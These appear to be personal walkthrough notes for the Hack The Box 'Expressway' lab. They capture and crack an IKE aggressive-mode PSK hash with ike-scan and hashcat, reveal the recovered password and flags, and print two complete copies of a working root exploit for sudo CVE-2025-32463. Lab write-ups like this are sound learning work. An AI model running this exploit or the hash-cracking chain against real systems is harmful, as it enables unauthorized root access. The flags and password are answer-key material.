
user flag 

### UDP Results

- **68/udp (DHCP client)** → Usually noise, rarely exploitable remotely unless you’re on the same broadcast domain.
    
- **69/udp (TFTP)** → This is a _big lead_. TFTP is unauthenticated, anonymous, and often misconfigured. If it’s really open, you may be able to download/upload files without creds.
    
- **500/udp (ISAKMP / IKE)** → Internet Key Exchange, part of IPsec VPNs. Can be vulnerable to aggressive mode leaks (usernames, hashes).
    
- **4500/udp (NAT-T IKE)** → Used in conjunction with ISAKMP for VPNs behind NAT.



Use 500

```
┌──(dkvv㉿OMEN)-[~]
└─$ sudo ike-scan -M 10.10.11.87

[sudo] password for dkvv: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Main Mode Handshake returned
	HDR=(CKY-R=bb4e1fe137e7bd1a)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.421 seconds (2.38 hosts/sec).  1 returned handshake; 0 returned notify
```

Aggresive scan and save hash

```
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Expressway]
└─$ sudo ike-scan -A -Ppsk.txt expressway.htb       

[sudo] password for dkvv: 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=1763d400b99a9528) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.522 seconds (1.92 hosts/sec).  1 returned handshake; 0 returned notify
```


HAsh

```txt
┌──(dkvv㉿OMEN)-[~/Desktop/HTB/Machines/Expressway]
└─$ cat psk.txt  
b3488c10985d45b1a9647141ba58e3966827ca055043cc5efe0e0cefde308aec3ee04ab6b01887ebe3589e91983c9be15c01bf917cc51e2fc6af4b7777d97e08f2b8a2def905aaa83909fd9fc7f990975ed2d7a2701829f9705ba60849fa2a834803a81c143e62b47631a99ca1040983d8924beda76127ba9963911f31168ce0:ee4cea6ee0fb1aed08735f1767b6d135877438e6659f1d0896a2242547997678f2f333945bdd9061830a9d4fdd20f3132be8a60ac892ece0ef936e2d6c930aae5a2adbe18a90f012200a08f364f72bcfc65354b74b82943fa3959a8a344f84cc6001621c6ee374e5a42148db709a2a21a3837027c9009a1982fcc862368e6690:1763d400b99a9528:e3bf189613404fe9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:0c0dda9f3a74367193585d8fcff3ccbb744c1ecf:d564feabe9b38848914424dd0d712b34717a466031dc063c708de474c2441e51:564ff4eb233744ea61c84c24a7c8b78328462cc7

```

use hash cat

```bash

b3488c10985d45b1a9647141ba58e3966827ca055043cc5efe0e0cefde308aec3ee04ab6b01887ebe3589e91983c9be15c01bf917cc51e2fc6af4b7777d97e08f2b8a2def905aaa83909fd9fc7f990975ed2d7a2701829f9705ba60849fa2a834803a81c143e62b47631a99ca1040983d8924beda76127ba9963911f31168ce0:ee4cea6ee0fb1aed08735f1767b6d135877438e6659f1d0896a2242547997678f2f333945bdd9061830a9d4fdd20f3132be8a60ac892ece0ef936e2d6c930aae5a2adbe18a90f012200a08f364f72bcfc65354b74b82943fa3959a8a344f84cc6001621c6ee374e5a42148db709a2a21a3837027c9009a1982fcc862368e6690:1763d400b99a9528:e3bf189613404fe9:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:0c0dda9f3a74367193585d8fcff3ccbb744c1ecf:d564feabe9b38848914424dd0d712b34717a466031dc063c708de474c2441e51:564ff4eb233744ea61c84c24a7c8b78328462cc7:freakingrockstarontheroad
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: b3488c10985d45b1a9647141ba58e3966827ca055043cc5efe0...462cc7
Time.Started.....: Sun Sep 21 23:03:35 2025 (1 sec)
Time.Estimated...: Sun Sep 21 23:03:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9960.0 kH/s (7.90ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8847360/14344385 (61.68%)
Rejected.........: 0/8847360 (0.00%)
Restore.Point....: 7864320/14344385 (54.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: giuli89 -> d7169653
Hardware.Mon.#1..: Temp: 42c Util: 20% Core:1627MHz Mem:5870MHz Bus:8

Started: Sun Sep 21 23:03:33 2025
Stopped: Sun Sep 21 23:03:37 2025
```

Login to ssh with the password



Privilgee escalation

https://www.exploit-db.com/exploits/52352

sudo version 1.9.17

```code
*Verify the sudo version running: sudo --versionIf is vulnerable, copy and
paste the following code and run it.*
*----------------------*
#!/bin/bash
# sudo-chwoot.sh – PoC CVE-2025-32463
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

# 1. NSS library
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void woot(void) {
    setreuid(0,0);          /* change to UID 0 */
    setregid(0,0);          /* change  to GID 0 */
    chdir("/");             /* exit from chroot */
    execl("/bin/bash","/bin/bash",NULL); /* root shell */
}
EOF


mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc            # make getgrnam() not fail

# 3. compile libnss_
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit…"
sudo -R woot woot                 # (-R <dir> <cmd>)
                                   # • the first “woot” is chroot
                                   # • the second “woot” is and inexistent
command
                                   #   (only needs resolve the user)

rm -rf "$STAGE"
```

https://github.com/junxian428/CVE-2025-32463/blob/main/priv_esc.sh

```Bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

user flag : 8dca0d0e0a6c4ffd49f5512fdee62c0b
root flag : 0c87dc5faaa2ed854523ad6b58e9439b
https://insidepwn.com/hackthebox-expressway-walkthrough

![[Pasted image 20250921230516.png]]https://labs.hackthebox.com/achievement/machine/2008231/736